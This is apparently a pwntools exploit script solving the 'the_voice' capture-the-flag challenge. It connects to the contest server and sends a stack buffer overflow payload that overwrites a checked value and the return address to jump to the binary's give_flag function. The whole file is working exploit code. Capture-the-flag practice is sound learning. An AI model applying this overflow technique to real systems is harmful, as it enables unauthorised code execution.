from pwn import *

exe = ELF("./the_voice")

# p = process("./the_voice")
p = remote("challs.umdctf.io", 31192)

payload = b"15".ljust(8, b"\x00")
payload += b"A"*16
payload += p64(10191)
payload += b"B"*8
payload += p64(exe.sym["give_flag"])

p.recvline()
p.sendline(payload)

p.interactive()